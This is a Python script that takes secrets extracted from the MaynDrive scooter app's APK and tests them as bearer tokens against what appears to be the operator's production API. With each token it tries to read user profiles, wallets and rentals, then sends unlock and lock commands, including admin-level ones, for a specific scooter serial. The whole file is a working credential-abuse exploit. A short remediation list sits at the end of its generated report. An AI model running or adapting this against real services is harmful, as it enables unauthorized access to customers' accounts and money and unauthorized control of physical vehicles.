#!/usr/bin/env python3
"""
Configured MaynDrive Token Tester
Test extracted tokens against your test API environment
"""

import requests
import json
from pathlib import Path

# CONFIGURATION - Update these values for your test environment
TEST_API_BASE_URL = "https://api.knotcity.io"  # Change this to your test API URL
TEST_SCOOTER_SERIAL = "TUF061"  # Test scooter serial number (use real format like TUF061, SXB306)
TEST_LATITUDE = 48.8566  # Test latitude (Paris coordinates from TUF script)
TEST_LONGITUDE = 2.3522  # Test longitude (Paris coordinates from TUF script)

def load_tokens():
    """Load extracted tokens from APK analysis"""
    apk_report_path = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/apk_analysis/apk_analysis_report.json"
    
    with open(apk_report_path, 'r') as f:
        data = json.load(f)
    
    tokens = data.get('extracted_secrets', {}).get('bearer_tokens', [])
    
    # Filter for potential JWT tokens and long strings
    potential_tokens = []
    for token in tokens:
        if (token.startswith('eyJ') or  # JWT tokens
            len(token) > 50 or  # Long strings
            token.startswith('MIIC') or  # Certificate-like
            'Bearer' in token or  # Bearer tokens
            (len(token) > 20 and token.replace('-', '').replace('_', '').isalnum())):  # Alphanumeric tokens
            potential_tokens.append(token)
    
    return potential_tokens[:15]  # Test first 15 tokens

def test_endpoint(token, endpoint, method="GET", payload=None):
    """Test a single endpoint with a token"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
        "Accept": "application/json"
    }
    
    try:
        if method == "GET":
            response = requests.get(f"{TEST_API_BASE_URL}{endpoint}", 
                                 headers=headers, timeout=15)
        elif method == "POST":
            response = requests.post(f"{TEST_API_BASE_URL}{endpoint}", 
                                  json=payload, headers=headers, timeout=15)
        else:
            return {"error": f"Unsupported method: {method}"}
        
        return {
            "status_code": response.status_code,
            "success": response.status_code in [200, 201],
            "response_body": response.text,
            "response_headers": dict(response.headers),
            "error": None
        }
        
    except requests.exceptions.Timeout:
        return {"error": "Request timeout", "success": False}
    except requests.exceptions.ConnectionError:
        return {"error": "Connection error", "success": False}
    except Exception as e:
        return {"error": str(e), "success": False}

def test_token_comprehensive(token):
    """Test a token against multiple endpoints"""
    print(f"🔑 Testing token: {token[:40]}...")
    
    results = {
        "token": token[:50] + "..." if len(token) > 50 else token,
        "endpoints": {}
    }
    
    # Test authentication endpoints
    auth_endpoints = [
        {"endpoint": "/api/application/users", "method": "GET", "name": "User Profile"},
        {"endpoint": "/api/application/users/wallet", "method": "GET", "name": "User Wallet"},
        {"endpoint": "/api/application/users/rents", "method": "GET", "name": "User Rentals"},
    ]
    
    for ep in auth_endpoints:
        result = test_endpoint(token, ep["endpoint"], ep["method"])
        results["endpoints"][ep["endpoint"]] = {
            "name": ep["name"],
            "result": result
        }
        
        if result.get("success"):
            print(f"   ✅ SUCCESS: {ep['name']} - Status: {result['status_code']}")
        else:
            error = result.get('error', result.get('status_code'))
            print(f"   ❌ FAILED: {ep['name']} - {error}")
    
    # Test vehicle operations if any auth endpoint succeeded
    auth_success = any(ep["result"].get("success") for ep in results["endpoints"].values())
    
    if auth_success:
        print("   🚗 Testing vehicle operations...")
        
        # Test different unlock payloads (exactly like TUF script)
        vehicle_payloads = [
            {
                "serial_number": TEST_SCOOTER_SERIAL,
                "lat": TEST_LATITUDE,
                "lng": TEST_LONGITUDE
            },
            {
                "serial": TEST_SCOOTER_SERIAL,
                "latitude": TEST_LATITUDE,
                "longitude": TEST_LONGITUDE
            },
            {
                "vehicle_id": TEST_SCOOTER_SERIAL,
                "lat": TEST_LATITUDE,
                "lng": TEST_LONGITUDE
            }
        ]
        
        # Test unlock with different payload formats
        for i, payload in enumerate(vehicle_payloads, 1):
            print(f"   [TEST {i}] Trying unlock payload format {i}")
            result = test_endpoint(token, "/api/application/vehicles/unlock", "POST", payload)
            results["endpoints"][f"/api/application/vehicles/unlock_format_{i}"] = {
                "name": f"Vehicle Unlock (Format {i})",
                "result": result
            }
            
            if result.get("success"):
                print(f"   🚨 CRITICAL: {TEST_SCOOTER_SERIAL} UNLOCKED with format {i}!")
                print(f"   📊 Response: {result['response_body']}")
            else:
                error = result.get('error', result.get('status_code'))
                print(f"   ❌ FAILED: Format {i} - {error}")
        
        # Test lock operation
        lock_payload = {
            "serial_number": TEST_SCOOTER_SERIAL,
            "lat": TEST_LATITUDE,
            "lng": TEST_LONGITUDE
        }
        
        result = test_endpoint(token, "/api/application/vehicles/freefloat/lock", "POST", lock_payload)
        results["endpoints"]["/api/application/vehicles/freefloat/lock"] = {
            "name": "Vehicle Lock",
            "result": result
        }
        
        if result.get("success"):
            print(f"   🚨 CRITICAL: {TEST_SCOOTER_SERIAL} LOCKED!")
        else:
            error = result.get('error', result.get('status_code'))
            print(f"   ❌ FAILED: Lock - {error}")
        
        # Test admin operations
        print("   👑 Testing admin operations...")
        
        admin_payload = {
            "serial_number": TEST_SCOOTER_SERIAL,
            "lat": TEST_LATITUDE,
            "lng": TEST_LONGITUDE
        }
        
        admin_endpoints = [
            {"endpoint": "/api/application/vehicles/unlock/admin", "method": "POST", "payload": admin_payload, "name": "Admin Unlock"},
            {"endpoint": "/api/application/vehicles/freefloat/lock/admin", "method": "POST", "payload": admin_payload, "name": "Admin Lock"},
        ]
        
        for ep in admin_endpoints:
            result = test_endpoint(token, ep["endpoint"], ep["method"], ep["payload"])
            results["endpoints"][ep["endpoint"]] = {
                "name": ep["name"],
                "result": result
            }
            
            if result.get("success"):
                print(f"   🚨 CRITICAL: {ep['name']} - Status: {result['status_code']}")
            else:
                error = result.get('error', result.get('status_code'))
                print(f"   ❌ FAILED: {ep['name']} - {error}")
    
    return results

def main():
    """Main testing function"""
    print("🧪 MaynDrive Token Tester - Configured Version")
    print("=" * 60)
    print(f"🎯 Test API: {TEST_API_BASE_URL}")
    print(f"🚗 Test Scooter: {TEST_SCOOTER_SERIAL}")
    print(f"📍 Test Location: {TEST_LATITUDE}, {TEST_LONGITUDE}")
    print("=" * 60)
    
    # Load tokens
    print("🔍 Loading extracted tokens from APK analysis...")
    tokens = load_tokens()
    print(f"✅ Found {len(tokens)} potential tokens to test")
    
    if not tokens:
        print("❌ No tokens found to test")
        return
    
    # Test each token
    all_results = []
    valid_tokens = []
    
    for i, token in enumerate(tokens, 1):
        print(f"\n📋 Testing Token {i}/{len(tokens)}")
        print("-" * 40)
        
        results = test_token_comprehensive(token)
        all_results.append(results)
        
        # Check if token has any successful endpoints
        has_success = any(ep["result"].get("success") for ep in results["endpoints"].values())
        if has_success:
            valid_tokens.append(results)
    
    # Summary
    print("\n" + "=" * 60)
    print("📊 TESTING SUMMARY")
    print("=" * 60)
    print(f"🎯 Test API: {TEST_API_BASE_URL}")
    print(f"🔍 Tokens Tested: {len(tokens)}")
    print(f"✅ Valid Tokens Found: {len(valid_tokens)}")
    
    if valid_tokens:
        print("\n🚨 VULNERABILITY CONFIRMED!")
        print("Valid tokens found that can access the API:")
        
        for i, vt in enumerate(valid_tokens, 1):
            print(f"\n   Token {i}: {vt['token']}")
            for endpoint, data in vt['endpoints'].items():
                if data['result'].get('success'):
                    print(f"      ✅ {data['name']}: Status {data['result']['status_code']}")
    else:
        print("\n✅ No valid tokens found in test environment")
    
    # Save detailed results
    results_data = {
        "test_configuration": {
            "api_base_url": TEST_API_BASE_URL,
            "test_scooter_serial": TEST_SCOOTER_SERIAL,
            "test_location": {"lat": TEST_LATITUDE, "lng": TEST_LONGITUDE}
        },
        "summary": {
            "total_tokens_tested": len(tokens),
            "valid_tokens_found": len(valid_tokens),
            "vulnerability_confirmed": len(valid_tokens) > 0
        },
        "detailed_results": all_results
    }
    
    output_file = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/configured_test_results.json"
    with open(output_file, 'w') as f:
        json.dump(results_data, f, indent=2)
    
    print(f"\n📁 Detailed results saved to: {output_file}")
    
    # Generate markdown report
    generate_markdown_report(results_data, valid_tokens)
    
    return len(valid_tokens) > 0

def generate_markdown_report(results_data, valid_tokens):
    """Generate markdown report"""
    report_content = f"""# MaynDrive Token Testing Results

## Test Configuration
- **Test API**: {results_data['test_configuration']['api_base_url']}
- **Test Scooter**: {results_data['test_configuration']['test_scooter_serial']}
- **Test Location**: {results_data['test_configuration']['test_location']['lat']}, {results_data['test_configuration']['test_location']['lng']}

## Summary
- **Total Tokens Tested**: {results_data['summary']['total_tokens_tested']}
- **Valid Tokens Found**: {results_data['summary']['valid_tokens_found']}
- **Vulnerability Confirmed**: {'YES' if results_data['summary']['vulnerability_confirmed'] else 'NO'}

## Valid Tokens Found
"""
    
    if valid_tokens:
        for i, vt in enumerate(valid_tokens, 1):
            report_content += f"\n### Token {i}: {vt['token']}\n"
            
            for endpoint, data in vt['endpoints'].items():
                if data['result'].get('success'):
                    report_content += f"- ✅ **{data['name']}**: Status {data['result']['status_code']}\n"
                else:
                    error = data['result'].get('error', data['result'].get('status_code'))
                    report_content += f"- ❌ **{data['name']}**: {error}\n"
    else:
        report_content += "\nNo valid tokens found.\n"
    
    report_content += f"""
## Conclusion

{'🚨 **VULNERABILITY CONFIRMED**: The test found valid tokens that can access the MaynDrive API without proper authentication.' if valid_tokens else '✅ **No vulnerabilities found**: No valid tokens were found in the test environment.'}

### Recommendations
1. Remove all hardcoded secrets from the application
2. Implement proper token management and rotation
3. Add server-side token validation
4. Implement rate limiting and monitoring

---
*Test conducted against: {results_data['test_configuration']['api_base_url']}*
"""
    
    output_file = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/configured_test_report.md"
    with open(output_file, 'w') as f:
        f.write(report_content)
    
    print(f"📄 Markdown report saved to: {output_file}")

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
